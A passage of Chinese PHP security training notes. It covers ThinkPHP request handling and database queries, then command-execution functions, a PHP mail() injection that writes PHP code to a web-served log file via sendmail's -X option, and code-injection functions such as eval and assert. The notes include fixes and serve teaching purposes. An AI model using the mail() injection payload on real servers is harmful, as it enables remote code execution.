Request::instance()-&gt;get(); // &#33719;&#21462;&#25152;&#26377;&#30340;get&#21464;&#37327;&#65288;&#32463;&#36807;&#36807;&#28388;&#30340;&#25968;&#32452;&#65289;
Request::instance()-&gt;get(false); // &#33719;&#21462;&#25152;&#26377;&#30340;get&#21464;&#37327;&#65288;&#21407;&#22987;&#25968;&#32452;&#65289;
</pre>
</div>

<p>
或者使用内置的助手函数 input 方法实现相同的功能：
</p>
<div class="org-src-container">
<pre class="src src-sh"><span style="color: #0000ff;">input</span>(<span style="color: #8b2252;">'get.id'</span>);
<span style="color: #0000ff;">input</span>(<span style="color: #8b2252;">'get.name'</span>);
<span style="color: #0000ff;">input</span>(<span style="color: #8b2252;">'get.'</span>);
</pre>
</div>

<p>
注：pathinfo地址参数不能通过get方法获取，查看“获取PARAM变量”
</p>
</div>
</div>
<div id="outline-container-h:ae3e0c26-e38b-4422-a8ad-bf79ce058307" class="outline-4">
<h4 id="h:ae3e0c26-e38b-4422-a8ad-bf79ce058307">获取POST变量</h4>
<div class="outline-text-4" id="text-h:ae3e0c26-e38b-4422-a8ad-bf79ce058307">
<div class="org-src-container">
<pre class="src src-sh">Request::instance()-&gt;post(<span style="color: #8b2252;">'name'</span>); // &#33719;&#21462;&#26576;&#20010;post&#21464;&#37327;
Request::instance()-&gt;post(); // &#33719;&#21462;&#32463;&#36807;&#36807;&#28388;&#30340;&#20840;&#37096;post&#21464;&#37327;
Request::instance()-&gt;post(false); // &#33719;&#21462;&#20840;&#37096;&#30340;post&#21407;&#22987;&#21464;&#37327;
</pre>
</div>

<p>
使用助手函数实现：
</p>
<div class="org-src-container">
<pre class="src src-sh"><span style="color: #0000ff;">input</span>(<span style="color: #8b2252;">'post.name'</span>);
<span style="color: #0000ff;">input</span>(<span style="color: #8b2252;">'post.'</span>);
</pre>
</div>
</div>
</div>
<div id="outline-container-h:538613f5-3214-49c6-9fd8-16d3df6f2984" class="outline-4">
<h4 id="h:538613f5-3214-49c6-9fd8-16d3df6f2984">获取PUT变量</h4>
<div class="outline-text-4" id="text-h:538613f5-3214-49c6-9fd8-16d3df6f2984">
<p>
安全上不允许用put方式
</p>

<div class="org-src-container">
<pre class="src src-sh">Request::instance()-&gt;put(<span style="color: #8b2252;">'name'</span>); // &#33719;&#21462;&#26576;&#20010;put&#21464;&#37327;
Request::instance()-&gt;put(); // &#33719;&#21462;&#20840;&#37096;&#30340;put&#21464;&#37327;&#65288;&#32463;&#36807;&#36807;&#28388;&#65289;
Request::instance()-&gt;put(false); // &#33719;&#21462;&#20840;&#37096;&#30340;put&#21407;&#22987;&#21464;&#37327;
</pre>
</div>

<p>
使用助手函数实现：
</p>
<div class="org-src-container">
<pre class="src src-sh"><span style="color: #0000ff;">input</span>(<span style="color: #8b2252;">'put.name'</span>);
<span style="color: #0000ff;">input</span>(<span style="color: #8b2252;">'put.'</span>);
</pre>
</div>
</div>
</div>
<div id="outline-container-h:cc73d254-48eb-4fac-9e0b-449732318238" class="outline-4">
<h4 id="h:cc73d254-48eb-4fac-9e0b-449732318238">获取REQUEST变量</h4>
<div class="outline-text-4" id="text-h:cc73d254-48eb-4fac-9e0b-449732318238">
<div class="org-src-container">
<pre class="src src-sh">Request::instance()-&gt;request(<span style="color: #8b2252;">'id'</span>); // &#33719;&#21462;&#26576;&#20010;request&#21464;&#37327;
Request::instance()-&gt;request(); // &#33719;&#21462;&#20840;&#37096;&#30340;request&#21464;&#37327;&#65288;&#32463;&#36807;&#36807;&#28388;&#65289;
Request::instance()-&gt;request(false); // &#33719;&#21462;&#20840;&#37096;&#30340;request&#21407;&#22987;&#21464;&#37327;&#25968;&#25454;
</pre>
</div>

<p>
使用助手函数实现：
</p>
<div class="org-src-container">
<pre class="src src-sh"><span style="color: #0000ff;">input</span>(<span style="color: #8b2252;">'request.id'</span>);
<span style="color: #0000ff;">input</span>(<span style="color: #8b2252;">'request.'</span>);
</pre>
</div>
</div>
</div>
<div id="outline-container-h:76d3e0a7-e53f-416d-bf20-cd319d36d1c7" class="outline-4">
<h4 id="h:76d3e0a7-e53f-416d-bf20-cd319d36d1c7">获取SERVER变量</h4>
<div class="outline-text-4" id="text-h:76d3e0a7-e53f-416d-bf20-cd319d36d1c7">
<div class="org-src-container">
<pre class="src src-sh">Request::instance()-&gt;server(<span style="color: #8b2252;">'PHP_SELF'</span>); // &#33719;&#21462;&#26576;&#20010;server&#21464;&#37327;
Request::instance()-&gt;server(); // &#33719;&#21462;&#20840;&#37096;&#30340;server&#21464;&#37327;
</pre>
</div>

<p>
使用助手函数实现：
</p>
<div class="org-src-container">
<pre class="src src-sh"><span style="color: #0000ff;">input</span>(<span style="color: #8b2252;">'server.PHP_SELF'</span>);
<span style="color: #0000ff;">input</span>(<span style="color: #8b2252;">'server.'</span>);
</pre>
</div>
</div>
</div>
<div id="outline-container-h:0a10eea2-5320-4ceb-8a24-8f7fdf27d130" class="outline-4">
<h4 id="h:0a10eea2-5320-4ceb-8a24-8f7fdf27d130">获取SESSION变量</h4>
<div class="outline-text-4" id="text-h:0a10eea2-5320-4ceb-8a24-8f7fdf27d130">
<div class="org-src-container">
<pre class="src src-sh">Request::instance()-&gt;session(<span style="color: #8b2252;">'user_id'</span>); // &#33719;&#21462;&#26576;&#20010;session&#21464;&#37327;
Request::instance()-&gt;session(); // &#33719;&#21462;&#20840;&#37096;&#30340;session&#21464;&#37327;
</pre>
</div>

<p>
使用助手函数实现：
</p>
<div class="org-src-container">
<pre class="src src-sh"><span style="color: #0000ff;">input</span>(<span style="color: #8b2252;">'session.user_id'</span>);
<span style="color: #0000ff;">input</span>(<span style="color: #8b2252;">'session.'</span>);
</pre>
</div>
</div>
<div id="outline-container-h:cc435f87-061b-4c8f-9b05-8416a358079f" class="outline-5">
<h5 id="h:cc435f87-061b-4c8f-9b05-8416a358079f">安全分享</h5>
<div class="outline-text-5" id="text-h:cc435f87-061b-4c8f-9b05-8416a358079f">
<p>
判断用户权限时，只能拿session中的和数据库中的，不能是用户自己可控的。
</p>
</div>
</div>
</div>
<div id="outline-container-h:4933c288-dcde-4eac-8b65-2c5fb18e5096" class="outline-4">
<h4 id="h:4933c288-dcde-4eac-8b65-2c5fb18e5096">获取Cookie变量</h4>
<div class="outline-text-4" id="text-h:4933c288-dcde-4eac-8b65-2c5fb18e5096">
<div class="org-src-container">
<pre class="src src-sh">Request::instance()-&gt;cookie(<span style="color: #8b2252;">'user_id'</span>); // &#33719;&#21462;&#26576;&#20010;cookie&#21464;&#37327;
Request::instance()-&gt;cookie(); // &#33719;&#21462;&#20840;&#37096;&#30340;cookie&#21464;&#37327;
</pre>
</div>

<p>
使用助手函数实现：
</p>
<div class="org-src-container">
<pre class="src src-sh"><span style="color: #0000ff;">input</span>(<span style="color: #8b2252;">'cookie.user_id'</span>);
<span style="color: #0000ff;">input</span>(<span style="color: #8b2252;">'cookie.'</span>);
</pre>
</div>
</div>
</div>
</div>
<div id="outline-container-h:2b5a7947-8cd6-4882-ba08-d10328f4cd59" class="outline-3">
<h3 id="h:2b5a7947-8cd6-4882-ba08-d10328f4cd59">变量过滤</h3>
<div class="outline-text-3" id="text-h:2b5a7947-8cd6-4882-ba08-d10328f4cd59">
<p>
框架默认没有设置任何过滤规则，你可以是配置文件中设置全局的过滤规则：
</p>
<div class="org-src-container">
<pre class="src src-sh">// &#40664;&#35748;&#20840;&#23616;&#36807;&#28388;&#26041;&#27861; &#29992;&#36887;&#21495;&#20998;&#38548;&#22810;&#20010;
<span style="color: #8b2252;">'default_filter'</span> =&gt; <span style="color: #8b2252;">'htmlspecialchars'</span>,
</pre>
</div>

<p>
也支持使用 Request 对象进行全局变量的获取过滤，过滤方式包括函数、方法过滤，以及PHP内置的Types of filters，我们可以设置全局变量过滤方法，例如：
</p>
<div class="org-src-container">
<pre class="src src-sh">Request::instance()-&gt;filter(<span style="color: #8b2252;">'htmlspecialchars'</span>);
</pre>
</div>

<p>
支持设置多个过滤方法，例如：
</p>
<div class="org-src-container">
<pre class="src src-sh">Request::instance()-&gt;filter([<span style="color: #8b2252;">'strip_tags'</span>,<span style="color: #8b2252;">'htmlspecialchars'</span>]),
</pre>
</div>

<p>
也可以在获取变量的时候添加过滤方法，例如：
</p>
<div class="org-src-container">
<pre class="src src-sh">Request::instance()-&gt;get(<span style="color: #8b2252;">'name'</span>,<span style="color: #8b2252;">''</span>,<span style="color: #8b2252;">'htmlspecialchars'</span>); // &#33719;&#21462;get&#21464;&#37327; &#24182;&#29992;htmlspecialchars&#20989;&#25968;&#36807;&#28388;
Request::instance()-&gt;param(<span style="color: #8b2252;">'username'</span>,<span style="color: #8b2252;">''</span>,<span style="color: #8b2252;">'strip_tags'</span>); // &#33719;&#21462;param&#21464;&#37327; &#24182;&#29992;strip_tags&#20989;&#25968;&#36807;&#28388;
Request::instance()-&gt;post(<span style="color: #8b2252;">'name'</span>,<span style="color: #8b2252;">''</span>,<span style="color: #8b2252;">'org\Filter::safeHtml'</span>); // &#33719;&#21462;post&#21464;&#37327; &#24182;&#29992;org\Filter&#31867;&#30340;safeHtml&#26041;&#27861;&#36807;&#28388;
</pre>
</div>

<p>
可以支持传入多个过滤规则，例如：
</p>
<div class="org-src-container">
<pre class="src src-sh">Request::instance()-&gt;param(<span style="color: #8b2252;">'username'</span>,<span style="color: #8b2252;">''</span>,<span style="color: #8b2252;">'strip_tags,strtolower'</span>); // &#33719;&#21462;param&#21464;&#37327; &#24182;&#20381;&#27425;&#35843;&#29992;strip_tags&#12289;strtolower&#20989;&#25968;&#36807;&#28388;
</pre>
</div>

<p>
Request对象还支持PHP内置提供的Filter ID过滤，例如：
</p>
<div class="org-src-container">
<pre class="src src-sh">Request::instance()-&gt;post(<span style="color: #8b2252;">'email'</span>,<span style="color: #8b2252;">''</span>,FILTER_VALIDATE_EMAIL);
</pre>
</div>

<p>
框架对FilterID做了转换支持，因此也可以使用字符串的方式，例如：
</p>
<div class="org-src-container">
<pre class="src src-sh">Request::instance()-&gt;post(<span style="color: #8b2252;">'email'</span>,<span style="color: #8b2252;">''</span>,<span style="color: #8b2252;">'email'</span>);
</pre>
</div>

<p>
采用字符串方式定义 FilterID 的时候，系统会自动进行一次 filter_id 调用转换成 Filter 常量。
</p>

<p>
具体的字符串根据 filter_list 函数的返回值来定义。
</p>

<p>
需要注意的是，采用Filter ID 进行过滤的话，如果不符合过滤要求的话 会返回false，因此你需要配合默认值来确保最终的值符合你的规范。
</p>

<p>
例如，
</p>
<div class="org-src-container">
<pre class="src src-sh">Request::instance()-&gt;post(<span style="color: #8b2252;">'email'</span>,<span style="color: #8b2252;">''</span>,FILTER_VALIDATE_EMAIL);
</pre>
</div>

<p>
就表示，如果不是规范的email地址的话 返回空字符串。
</p>

<p>
如果当前不需要进行任何过滤的话，可以使用（ V5.0.3+ 版本）
</p>
<div class="org-src-container">
<pre class="src src-sh">// &#33719;&#21462;get&#21464;&#37327; &#24182;&#19988;&#19981;&#36827;&#34892;&#20219;&#20309;&#36807;&#28388; &#21363;&#20351;&#35774;&#32622;&#20102;&#20840;&#23616;&#36807;&#28388;
Request::instance()-&gt;get(<span style="color: #8b2252;">'name'</span>,<span style="color: #8b2252;">''</span>,null);
</pre>
</div>
</div>
</div>
<div id="outline-container-h:c2163427-b70b-4ddb-95ec-9a1126f28d4b" class="outline-3">
<h3 id="h:c2163427-b70b-4ddb-95ec-9a1126f28d4b">获取部分变量</h3>
<div class="outline-text-3" id="text-h:c2163427-b70b-4ddb-95ec-9a1126f28d4b">
<p>
如果你只需要获取当前请求的部分参数，可以使用：
</p>
<div class="org-src-container">
<pre class="src src-sh">// &#21482;&#33719;&#21462;&#24403;&#21069;&#35831;&#27714;&#30340;id&#21644;name&#21464;&#37327;
Request::instance()-&gt;only(<span style="color: #8b2252;">'id,name'</span>);
</pre>
</div>

<p>
或者使用数组方式
</p>
<div class="org-src-container">
<pre class="src src-sh">// &#21482;&#33719;&#21462;&#24403;&#21069;&#35831;&#27714;&#30340;id&#21644;name&#21464;&#37327;
Request::instance()-&gt;only([<span style="color: #8b2252;">'id'</span>,<span style="color: #8b2252;">'name'</span>]);
</pre>
</div>

<p>
默认获取的是当前请求参数，如果需要获取其它类型的参数，可以使用第二个参数，例如：
</p>
<div class="org-src-container">
<pre class="src src-sh">// &#21482;&#33719;&#21462;GET&#35831;&#27714;&#30340;id&#21644;name&#21464;&#37327;
Request::instance()-&gt;only([<span style="color: #8b2252;">'id'</span>,<span style="color: #8b2252;">'name'</span>],<span style="color: #8b2252;">'get'</span>);
// &#21482;&#33719;&#21462;POST&#35831;&#27714;&#30340;id&#21644;name&#21464;&#37327;
Request::instance()-&gt;only([<span style="color: #8b2252;">'id'</span>,<span style="color: #8b2252;">'name'</span>],<span style="color: #8b2252;">'post'</span>);
</pre>
</div>
</div>
</div>
<div id="outline-container-h:fbec423a-babf-40d5-ab0d-2e3053cb7fce" class="outline-3">
<h3 id="h:fbec423a-babf-40d5-ab0d-2e3053cb7fce">排除部分变量</h3>
<div class="outline-text-3" id="text-h:fbec423a-babf-40d5-ab0d-2e3053cb7fce">
<p>
也支持排除某些变量获取，例如
</p>
<div class="org-src-container">
<pre class="src src-sh">// &#25490;&#38500;id&#21644;name&#21464;&#37327;
Request::instance()-&gt;except(<span style="color: #8b2252;">'id,name'</span>);
</pre>
</div>

<p>
或者使用数组方式
</p>
<div class="org-src-container">
<pre class="src src-sh">// &#25490;&#38500;id&#21644;name&#21464;&#37327;
Request::instance()-&gt;except([<span style="color: #8b2252;">'id'</span>,<span style="color: #8b2252;">'name'</span>]);
</pre>
</div>

<p>
同样支持指定变量类型获取：
</p>
<div class="org-src-container">
<pre class="src src-sh">// &#25490;&#38500;GET&#35831;&#27714;&#30340;id&#21644;name&#21464;&#37327;
Request::instance()-&gt;except([<span style="color: #8b2252;">'id'</span>,<span style="color: #8b2252;">'name'</span>],<span style="color: #8b2252;">'get'</span>);
// &#25490;&#38500;POST&#35831;&#27714;&#30340;id&#21644;name&#21464;&#37327;
Request::instance()-&gt;except([<span style="color: #8b2252;">'id'</span>,<span style="color: #8b2252;">'name'</span>],<span style="color: #8b2252;">'post'</span>);
</pre>
</div>
</div>
</div>
<div id="outline-container-h:aac35fb1-4b0a-4cea-97b7-ee9024ea1832" class="outline-3">
<h3 id="h:aac35fb1-4b0a-4cea-97b7-ee9024ea1832">变量修饰符</h3>
<div class="outline-text-3" id="text-h:aac35fb1-4b0a-4cea-97b7-ee9024ea1832">
<p>
input 函数支持对变量使用修饰符功能，可以更好的过滤变量。
</p>

<p>
用法如下：
</p>
<div class="org-src-container">
<pre class="src src-sh"><span style="color: #0000ff;">input</span>(<span style="color: #8b2252;">'&#21464;&#37327;&#31867;&#22411;.&#21464;&#37327;&#21517;/&#20462;&#39280;&#31526;'</span>);
&#25110;&#32773;
Request::instance()-&gt;&#21464;&#37327;&#31867;&#22411;(<span style="color: #8b2252;">'&#21464;&#37327;&#21517;/&#20462;&#39280;&#31526;'</span>);
</pre>
</div>

<p>
例如：
</p>
<div class="org-src-container">
<pre class="src src-sh"><span style="color: #0000ff;">input</span>(<span style="color: #8b2252;">'get.id/d'</span>);
<span style="color: #0000ff;">input</span>(<span style="color: #8b2252;">'post.name/s'</span>);
<span style="color: #0000ff;">input</span>(<span style="color: #8b2252;">'post.ids/a'</span>);
Request::instance()-&gt;get(<span style="color: #8b2252;">'id/d'</span>);
</pre>
</div>

<p>
ThinkPHP5.0版本默认的变量修饰符是 /s ，如果需要传入字符串之外的变量可以使用下面的修饰符，包括：
</p>
<div class="org-src-container">
<pre class="src src-sh">&#20462;&#39280;&#31526; &#20316;&#29992;
s &#24378;&#21046;&#36716;&#25442;&#20026;&#23383;&#31526;&#20018;&#31867;&#22411;
d &#24378;&#21046;&#36716;&#25442;&#20026;&#25972;&#22411;&#31867;&#22411;
b &#24378;&#21046;&#36716;&#25442;&#20026;&#24067;&#23572;&#31867;&#22411;
a &#24378;&#21046;&#36716;&#25442;&#20026;&#25968;&#32452;&#31867;&#22411;
f &#24378;&#21046;&#36716;&#25442;&#20026;&#28014;&#28857;&#31867;&#22411;
</pre>
</div>
</div>
</div>
<div id="outline-container-h:bf90978e-6889-485b-aff6-0f52665c96a5" class="outline-3">
<h3 id="h:bf90978e-6889-485b-aff6-0f52665c96a5">原生查询</h3>
<div class="outline-text-3" id="text-h:bf90978e-6889-485b-aff6-0f52665c96a5">
<p>
Db 类支持原生 SQL 查询操作，主要包括下面两个方法：
</p>
</div>
<div id="outline-container-h:a1460af5-5957-4b52-8b07-344916716a3b" class="outline-4">
<h4 id="h:a1460af5-5957-4b52-8b07-344916716a3b">query方法</h4>
<div class="outline-text-4" id="text-h:a1460af5-5957-4b52-8b07-344916716a3b">
<p>
query 方法用于执行 SQL 查询操作，如果数据非法或者查询错误则返回false，否则返回查询结果数据集（同 select 方法）。
</p>

<p>
使用示例：
</p>
<div class="org-src-container">
<pre class="src src-sh">Db::query(<span style="color: #8b2252;">"select * from think_user where status=1"</span>);
</pre>
</div>
</div>
</div>
<div id="outline-container-h:b02cdcc9-3a91-4181-8e6c-66b0361d16b9" class="outline-4">
<h4 id="h:b02cdcc9-3a91-4181-8e6c-66b0361d16b9">execute方法</h4>
<div class="outline-text-4" id="text-h:b02cdcc9-3a91-4181-8e6c-66b0361d16b9">
<p>
execute用于更新和写入数据的sql操作，如果数据非法或者查询错误则返回false ，否则返回影响的记录数。
使用示例：
</p>
<div class="org-src-container">
<pre class="src src-sh">Db::execute(<span style="color: #8b2252;">"update think_user set name='thinkphp' where status=1"</span>);
</pre>
</div>
</div>
</div>
</div>
<div id="outline-container-h:194cefec-42cb-4d64-860f-875089fcae54" class="outline-3">
<h3 id="h:194cefec-42cb-4d64-860f-875089fcae54">参数绑定</h3>
<div class="outline-text-3" id="text-h:194cefec-42cb-4d64-860f-875089fcae54">
<p>
支持在原生查询的时候使用参数绑定，包括问号占位符或者命名占位符，例如：
</p>
<div class="org-src-container">
<pre class="src src-sh">Db::query(<span style="color: #8b2252;">'select * from think_user where id=?'</span>,[8]);
Db::execute(<span style="color: #8b2252;">'insert into think_user (id, name) values (?, ?)'</span>,[8,<span style="color: #8b2252;">'thinkphp'</span>]);
</pre>
</div>

<p>
也支持命名占位符绑定，例如：
</p>
<div class="org-src-container">
<pre class="src src-sh">Db::query(<span style="color: #8b2252;">'select * from think_user where id=:id'</span>,[<span style="color: #8b2252;">'id'</span>=&gt;8]);
Db::execute(<span style="color: #8b2252;">'insert into think_user (id, name) values (:id, :name)'</span>, [<span style="color: #8b2252;">'id'</span>=&gt;8,<span style="color: #8b2252;">'name'</span>=&gt;<span style="color: #8b2252;">'thinkphp'</span>]);
</pre>
</div>
</div>
</div>
<div id="outline-container-h:478b49b8-81a9-4263-af43-71bdd0f24872" class="outline-3">
<h3 id="h:478b49b8-81a9-4263-af43-71bdd0f24872">基本查询</h3>
<div class="outline-text-3" id="text-h:478b49b8-81a9-4263-af43-71bdd0f24872">
<p>
查询一个数据使用：
</p>
<div class="org-src-container">
<pre class="src src-sh">// table&#26041;&#27861;&#24517;&#39035;&#25351;&#23450;&#23436;&#25972;&#30340;&#25968;&#25454;&#34920;&#21517;
Db::table(<span style="color: #8b2252;">'think_user'</span>)-&gt;where(<span style="color: #8b2252;">'id'</span>,1)-&gt;find();

<span style="color: #b22222;">#</span><span style="color: #b22222;">&#21482;&#35201;&#19981;&#26159;&#27491;&#24120;&#20889;sql&#30340;&#65292;&#37117;&#26159;orm&#35821;&#27861;&#12290;orm &#33258;&#24102;&#39044;&#32534;&#35793;</span>
&#39044;&#32534;&#35793;&#36825;&#20010;&#21160;&#20316;&#26159;&#35841;&#20570;&#30340;&#65311;
&#25968;&#25454;&#24211;&#65292;mysql &#12290;orm&#19981;&#26159;&#25152;&#26377;&#22320;&#26041;&#37117;&#25903;&#25345;&#39044;&#32534;&#35793;&#30340;&#12290;
</pre>
</div>

<p>
find 方法查询结果不存在，返回 null
</p>

<p>
查询数据集使用：
</p>
<div class="org-src-container">
<pre class="src src-sh">Db::table(<span style="color: #8b2252;">'think_user'</span>)-&gt;where(<span style="color: #8b2252;">'status'</span>,1)-&gt;select();
</pre>
</div>

<p>
select 方法查询结果不存在，返回空数组
如果设置了数据表前缀参数的话，可以使用
</p>
<div class="org-src-container">
<pre class="src src-sh">Db::name(<span style="color: #8b2252;">'user'</span>)-&gt;where(<span style="color: #8b2252;">'id'</span>,1)-&gt;find();
Db::name(<span style="color: #8b2252;">'user'</span>)-&gt;where(<span style="color: #8b2252;">'status'</span>,1)-&gt;select();
</pre>
</div>
</div>
</div>
</section>
<section id="outline-container-h:7e1a5b51-d8c2-4e36-b1e9-79734dd10496" class="outline-2">
<h2 id="h:7e1a5b51-d8c2-4e36-b1e9-79734dd10496">漏洞讲解</h2>
<div class="outline-text-2" id="text-h:7e1a5b51-d8c2-4e36-b1e9-79734dd10496">
<p>
主要内容：
</p>
<ul class="org-ul">
<li>mail 函数漏洞</li>
<li>SQL 注入</li>
<li>命令执行</li>
<li>变量覆盖</li>
<li>XSS</li>
<li>XXE</li>
<li>CSRF</li>
<li>SSRF</li>
<li>重定向</li>
<li>文件上传</li>
<li>反序列化</li>
<li>Laravel 框架</li>
<li>防护方案</li>
<li>函数</li>
</ul>
</div>
<div id="outline-container-h:50204c69-de20-4003-83f9-61890894eff7" class="outline-3">
<h3 id="h:50204c69-de20-4003-83f9-61890894eff7">PHP敏感函数</h3>
<div class="outline-text-3" id="text-h:50204c69-de20-4003-83f9-61890894eff7">
</div>
<div id="outline-container-h:5d1ee97e-f887-4109-8d2a-b7339cf9067c" class="outline-4">
<h4 id="h:5d1ee97e-f887-4109-8d2a-b7339cf9067c">命令执行函数</h4>
<div class="outline-text-4" id="text-h:5d1ee97e-f887-4109-8d2a-b7339cf9067c">
<p>
函数/语法 描述 例子
</p>
<ul class="org-ul">
<li>system 执行命令并输出结果; system('id');</li>
<li>exec 执行命令 只可获取最后一行结果; exec('id',$a); print_r($a);</li>
<li>passthru 同 system; passthru('id');</li>
</ul>
<p>
shell_exec (反引号) | 执行命令并返回结果 |
$a=shell_exec('id');print_r($a);$a= id`;print_r($a);
</p>

<ul class="org-ul">
<li>popen 执行命令并建立管道 返回一个指针 使用fread 等函数操作指针进行读写; $a=popen("id", "r"); echo fread($a, 2096);</li>
<li>proc_open 同 popen (进程控制功能更强大); <a href="https://www.php.net/manual/zh/function.proc-open">见PHP手册</a></li>
<li>pcntl_exec 执行命令 只返回是否发生错误 pcntl_exec('id');</li>
</ul>

<div class="org-src-container">
<pre class="src src-sh">&lt;?php
<span style="color: #a020f0;">exec</span>(<span style="color: #8b2252;">'ping 127.0.0.1'</span>,$<span style="color: #a0522d;">output</span>,$<span style="color: #a0522d;">return_var</span>);
<span style="color: #0000ff;">system</span>(<span style="color: #8b2252;">'ping -c 127.0.0.1'</span>,$<span style="color: #a0522d;">return_var</span>);
<span style="color: #0000ff;">passthru</span>(<span style="color: #8b2252;">'ping 12.0.0.1'</span>,$<span style="color: #a0522d;">return_var</span>);
<span style="color: #0000ff;">passthru</span>(<span style="color: #8b2252;">'id'</span>);
<span style="color: #0000ff;">shell_exec</span>(<span style="color: #8b2252;">"ping 127.0.0.1"</span>);
<span style="color: #0000ff;">shell_exec</span>(<span style="color: #ff00ff;">`ping 127.0.0.1`</span>);
<span style="color: #0000ff;">popen</span>(<span style="color: #8b2252;">"id"</span>, <span style="color: #8b2252;">"r"</span>);
<span style="color: #0000ff;">pcntl_exec</span>(<span style="color: #8b2252;">'id'</span>);
</pre>
</div>
</div>
</div>
<div id="outline-container-h:f66c16d1-40d1-4b3e-b220-1368c21543a9" class="outline-4">
<h4 id="h:f66c16d1-40d1-4b3e-b220-1368c21543a9">mail 函数</h4>
<div class="outline-text-4" id="text-h:f66c16d1-40d1-4b3e-b220-1368c21543a9">
<p>
php的mail函数声明如下：
</p>

<p>
其参数含义分别表示如下：
</p>
<ul class="org-ul">
<li>to，指定邮件接收者，即接收人</li>
<li>subject，邮件的标题</li>
<li>message，邮件的正文内容</li>
<li>additional_headers，指定邮件发送时其他的额外头部，如发送者From，抄送CC，隐藏抄送BCC</li>
<li>additional_parameters，指定传递给发送程序sendmail的额外参数。</li>
</ul>

<p>
在Linux系统上，mail函数在底层实现中，默认调用Linux的sendmail程序发送邮件。在sendmail程序的参数中，有一个 -X 选项，用于记录所有的邮件进出流量至log文件中。
</p>

<p>
通过 -X 指定log文件记录邮件流量，实际可以达到写文件的效果。
例如，如下php代码
</p>
<div class="org-src-container">
<pre class="src src-sh">$<span style="color: #a0522d;">to</span> = <span style="color: #8b2252;">'Alice@example.com'</span>;
$<span style="color: #a0522d;">subject</span> = <span style="color: #8b2252;">'Hello Alice!'</span>;
$<span style="color: #a0522d;">message</span>=&#8216;&lt;?php phhpinfo(); ?&gt;&#8217;&#65307;
$<span style="color: #a0522d;">headers</span> = <span style="color: #8b2252;">"CC: somebodyelse@example.com"</span>;
$<span style="color: #a0522d;">options</span> = <span style="color: #8b2252;">'-OQueueDirectory=/tmp -X/var/www/html/rce.php'</span>;
<span style="color: #0000ff;">mail</span>($<span style="color: #a0522d;">to</span>, $<span style="color: #a0522d;">subject</span>, $<span style="color: #a0522d;">message</span>, $<span style="color: #a0522d;">headers</span>, $<span style="color: #a0522d;">options</span>);
</pre>
</div>

<p>
执行后，查看log文件 /var/www/html/rce.php
</p>

<div class="org-src-container">
<pre class="src src-sh">17220 &lt;&lt;&lt; To: Alice@example.com
17220 &lt;&lt;&lt; Subject: Hello Alice!
17220 &lt;&lt;&lt; X-PHP-Originating-Script: 0:test.php
17220 &lt;&lt;&lt; CC: somebodyelse@example.com
17220 &lt;&lt;&lt;
17220 &lt;&lt;&lt; &lt;?php phpinfo(); ?&gt;
17220 &lt;&lt;&lt; [EOF]
</pre>
</div>

<p>
发现被写入了包含在邮件标题或正文中的php代码，通过访问此log文件可以执行预先可控的php代码。
</p>

<p>
因此，对php mail函数使用时，应该特别注意第5个参数 additional_parameters 的使用，防止被攻击者可控，注入 -X 参数，执行命令。
</p>

<p>
<b>修复方案</b>
</p>

<p>
方案一：使用过滤函数内置函数 escapeshellcmd(), escapeshellarg() ,过滤和转义输入中的特殊字符
</p>

<p>
escapeshellcmd()：会在以下字符之前插入反斜线（\）： &amp;#;`|*?~&lt;&gt;^()[]{}$\, \x0A 和 \xFF。 ' 和 " 仅在不配对儿的时候被转义。
</p>

<p>
在 Windows 平台上，所有这些字符以及 % 和 ! 字符都会被空格代替。
</p>

<p>
escapeshellarg()：将给字符串增加一个单引号并且能引用或者转码任何已经存在的单引号，这样以确保能够直接将一个字符串传入 shell 函数，并且还是确保安全的。对于用户输入的部分参数就应该使用这个函数。
</p>
</div>
</div>
<div id="outline-container-h:6bd9b26d-1694-412b-9907-58b867cd0b80" class="outline-4">
<h4 id="h:6bd9b26d-1694-412b-9907-58b867cd0b80">代码注入/文件包含函数</h4>
<div class="outline-text-4" id="text-h:6bd9b26d-1694-412b-9907-58b867cd0b80">
<div class="org-src-container">
<pre class="src src-sh">&#20989;&#25968;/&#35821;&#27861;&#32467;&#26500; &#25551;&#36848; &#20363;&#23376;
<span style="color: #483d8b;">eval</span> &#23558;&#20256;&#20837;&#30340;&#21442;&#25968;&#20869;&#23481;&#20316;&#20026;PHP&#20195;&#30721;&#25191;&#34892; eval &#19981;&#26159;&#20989;&#25968; &#26159;&#19968;&#31181;&#35821;&#27861;&#32467;&#26500;&#19981;&#33021;&#24403;&#20570;&#20989;&#25968;&#21160;&#24577;&#35843;&#29992;
<span style="color: #483d8b;">eval</span>(<span style="color: #8b2252;">'phpinfo();'</span>);

assert &#23558;&#20256;&#20837;&#30340;&#21442;&#25968;&#20869;&#23481;&#20316;&#20026;PHP&#20195;&#30721;&#25191;&#34892; &#29256;&#26412;&#22312;PHP7&#20197;&#19979;&#26159;&#20989;&#25968;PHP7&#21450;&#20197;&#19978;&#20026;&#35821;&#27861;&#32467;&#26500;
<span style="color: #0000ff;">assert</span>(<span style="color: #8b2252;">'phpinfo();'</span>);

preg_replace &#24403;preg_replace&#20351;&#29992;/e&#20462;&#39280;&#31526;&#19988;&#21407;&#23383;&#31526;&#20018;&#21487;&#25511;&#26102;&#26102; &#26377;&#21487;&#33021;&#25191;&#34892;php&#20195;&#30721;
<span style="color: #483d8b;">echo</span> preg_replace(<span style="color: #8b2252;">"/e"</span>,<span style="color: #8b2252;">"{${PHPINFO()}}"</span>,<span style="color: #8b2252;">"123"</span>);

call_user_func &#25226;&#31532;&#19968;&#20010;&#21442;&#25968;&#20316;&#20026;&#22238;&#35843;&#20989;&#25968;&#35843;&#29992; &#38656;&#35201;&#20004;&#20010;&#21442;&#25968;&#37117;&#23436;&#20840;&#21487;&#25511;&#25165;&#21487;&#21033;&#29992; &#21482;&#33021;&#20256;&#20837;&#19968;&#20010;&#21442;&#25968;&#35843;&#29992;
<span style="color: #0000ff;">call_user_func</span>(<span style="color: #8b2252;">'assert'</span>,<span style="color: #8b2252;">'phpinfo();'</span>);

call_user_func_array &#21516;call_user_func &#21487;&#20256;&#20837;&#19968;&#20010;&#25968;&#32452;&#24102;&#20837;&#22810;&#20010;&#21442;&#25968;&#35843;&#29992;&#20989;&#25968;
<span style="color: #0000ff;">call_user_func_array</span>(<span style="color: #8b2252;">'file_put_contents'</span>,[<span style="color: #8b2252;">'1.txt'</span>,<span style="color: #8b2252;">'6666'</span>]);

